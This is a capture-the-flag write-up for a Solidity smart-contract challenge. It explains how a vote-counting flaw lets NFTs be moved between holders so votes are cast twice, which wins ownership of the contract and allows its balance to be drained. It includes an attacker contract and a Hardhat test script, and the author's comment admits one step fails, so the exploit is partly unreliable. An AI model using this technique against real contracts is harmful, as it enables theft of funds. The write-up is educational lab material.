# Democracy

## Goals

=> Drain the victimContracts balance to 0

### Hints

- None

### Solution

- There is an error in the business logic, we can just set a challenger which gets minted 2 NFTs, we can then approve one NFT to a malicious contract and send the NFT to that contract, we can then do 1 vote (since we only have 1 NFT in posession) 5 + 3 + 1 = 9 and the contract checks if that numer is >= TOTAL_CAP which equals 10, after that we can approve and send the second nft to our contract, which then can vote twice and we now have 6 votes which results in 11 votes toatl >= 10 => this then triggers the `_callElection()` function and we become the owner, we can now use the `withdrawToAddress()` since we are now the owner and have succesfully drained the contract

### Attacker Contract

```solidity
contract DemocracyAttacker is IERC721Receiver {
    Democracy target;
    address public player;

    constructor(address _target, address _player) {
        target = Democracy(_target);
        player = _player;
    }

    function attack() external {
        target.vote(player);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

### Test

```javascript
it('conduct your attack here', async function () {
	const AttackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
	const attackerContract = await AttackerFactory.deploy(
		victimContract.address,
		attackerWallet.address
	);
	const nominateTx = await victimContract
		.connect(attackerWallet)
		.nominateChallenger(attackerWallet.address);
	await nominateTx.wait();
	// attacker wallet gets minted 2 NFT's (Id 0 & 1) which we will approve the attacker contract for
	const approveTxZero = await victimContract
		.connect(attackerWallet)
		.approve(attackerContract.address, 0);
	await approveTxZero.wait();
	const approveTxOne = await victimContract
		.connect(attackerWallet)
		.approve(attackerContract.address, 1);
	await approveTxOne.wait();
	// now we transfer one nft to our contract
	const transferTxZero = await victimContract
		.connect(attackerWallet)
		.transferFrom(attackerWallet.address, attackerContract.address, 0);
	await transferTxZero.wait();
	// now we vote on ourself so amount of votes < 10
	const voteTx = await victimContract.connect(attackerWallet).vote(attackerWallet.address);
	await voteTx.wait();
	// now we transfer the second nft to the contract
	const transferTxOne = await victimContract
		.connect(attackerWallet)
		.transferFrom(attackerWallet.address, attackerContract.address, 1);
	await transferTxOne.wait();
	// now we just need to call attack which is basically just calling vote with 2 votes since we own 2 nfts
	console.log(attackerWallet.address);
	console.log(await attackerContract);
	// This Tx fails idk why
	const contractVoteTx = await attackerContract.attack();
	console.log('contract Vote Tx', contractVoteTx);
	await contractVoteTx.wait();
	const withdrawTx = await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet);
	await withdrawTx.wait();
});
```
